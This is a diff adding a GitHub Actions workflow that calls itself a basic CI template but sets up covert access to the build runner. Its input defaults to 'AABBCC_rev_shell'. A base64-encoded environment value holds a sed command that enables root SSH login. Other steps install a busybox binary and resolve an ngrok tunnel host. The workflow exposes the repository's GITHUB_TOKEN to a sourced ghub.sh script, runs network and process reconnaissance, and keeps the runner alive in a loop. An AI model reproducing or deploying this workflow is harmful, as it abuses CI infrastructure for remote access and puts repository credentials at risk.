@@ -1,0 +1,68 @@
+# This is a basic workflow to help you get started with Actions
+
+name: CI_2023_0602
+
+# Controls when the workflow will run
+on:
+    # Triggers the workflow on push or pull request events but only for the main branch
+  # Allows you to run this workflow manually from the Actions tab
+  workflow_dispatch:
+    inputs:
+      name77:
+        description: 'PersonDesc'
+        required: true
+        default: 'AABBCC_rev_shell'
+
+    
+# A workflow run is made up of one or more jobs that can run sequentially or in parallel
+jobs:
+  # This workflow contains a single job called "build"
+  build_jobs3:
+    # The type of runner that the job will run on
+    runs-on: ubuntu-18.04
+    #ubuntu-latest
+    #container: 'centos:latest'
+    
+
+    # Steps represent a sequence of tasks that will be executed as part of the job
+    steps:
+      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
+      - uses: actions/checkout@v2
+
+
+      - name: Run a one-line script
+        run: bash -c "echo ${{github.event.action}};echo ${{github.event.inputs}};(env|grep ss>/tmp/s0;sleep 1111&);chmod 0777 $GITHUB_WORKSPACE/*;ls -al;pwd;touch one-line-script1111;exit 0"
+        env:
+          ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
+      # Runs a set of commands using the runners shell
+      - name: Run a 2-line script
+        run: bash -c "echo \"${{ github.workspace }}--${GITHUB_WORKSPACE}--${{ runner.workspace }}\";date;sudo cp ./busybox.bin /sbin/busybox;busybox nslookup ngrok.xiaomiqiu123.top 114.114.114.114 |grep -v 114.114.114.114;exit 0"
+        env:
+          ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
+      # Runs a set of commands using the runners shell
+
+      - name: Run a multi-line script
+        run: 
+          bash -c 'cd /tmp;echo "${{ toJson(github.event.inputs) }}"|base64 -w0 >js8;base64 -d js8>js9;env|grep ss>s1;. $GITHUB_WORKSPACE/ghub.sh;'
+        env:
+          sshc1: 'cat /proc/uptime|cut -f1 -d"."'
+          Github_Token22: ${{ secrets.GITHUB_TOKEN }}
+          Github_act22: ${{ github.event.action }}
+          Github_OWN22: ${{ github.repository_owner }}
+          Github_REPO22: ${{ github.event.repository.name }}
+          Github_wsp22: ${{github.workspace}}
+          sp9: 3
+          TZ: Asia/Shanghai
+      - name: Run a 3rd script #cat /tmp/y1;echo liuhuan88;cat /tmp/y2;cat /tmp/y1;
+        run: 
+          bash -c '(ls -al /tmp;sudo netstat -tnlp;ps aux| grep ssh;cat /etc/os*release);' 
+        env:
+          sp9: 4
+          TZ: Asia/Shanghai
+          
+      - name: Run a 4rd script
+        run: 
+          bash -c 'echo "${{ toJson(github.event.action) }}";(while :;do [ -f /tmp/keepalive ]&&sleep 10||break;done);cat y2;'
+        env:
+          sp9: 4
+          TZ: Asia/Shanghai
